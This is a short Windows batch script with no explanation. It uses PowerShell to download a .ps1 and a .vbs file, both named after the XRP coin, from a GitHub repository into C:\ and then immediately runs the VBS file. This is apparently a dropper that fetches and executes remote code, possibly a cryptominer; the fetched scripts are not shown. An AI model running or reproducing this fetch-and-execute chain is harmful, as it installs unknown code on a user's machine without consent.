@echo off
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRP.ps1' -OutFile 'C:\XRP.ps1'"
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRP.vbs' -OutFile 'C:\XRP.vbs'"
powershell -NoProfile -Command "Start-Sleep -Seconds 1"
powershell -NoProfile -Command "Start-Process -FilePath 'C:\XRP.vbs'"
exit
